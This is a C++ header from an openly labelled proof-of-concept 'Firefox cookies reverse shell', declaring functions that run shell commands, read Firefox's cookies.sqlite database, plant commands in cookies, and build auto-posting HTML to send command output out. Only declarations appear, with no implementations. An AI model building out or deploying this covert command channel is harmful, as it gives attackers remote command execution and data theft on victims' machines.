/*
Firefox's cookies reverse shell - PoC version - THis is Server
Coded by CoolerVoid - 17/12/2017

To compile:
	c++ -o test test.cpp utils.cpp sqlite.o
	
	
*/
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <string>
#include <vector>
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>
#include <memory>
#include <pwd.h>
#include <array>
#include "lib/sqlite3.h"
#include <stdexcept>
#include <sstream>
#include <sys/types.h> 
#include <dirent.h> 

using namespace std;

extern string domain;

static const string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static inline bool is_base64(unsigned char c);
string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
string base64_decode(string const& encoded_string);	
string readfile(const string &filepath); 
string exec_command(string cmd); 
string get_unix_username();
string get_default_firefox_profiledir(const string& name);
string get_firefox_sqlite_path();
void write_cmd_cookie(); // write  cmd command in cookie
void Write_File(string filename, string buf); 
void construct_html(string result_cmd, string filename); // write html to auto js to POST, to send result of CMD
void send_result_cmd(string html_file);
static int callback(void *data, int argc, char **argv, char **azColName); // result of select query in cookies.sqlite
void start_cookie_tunnel();

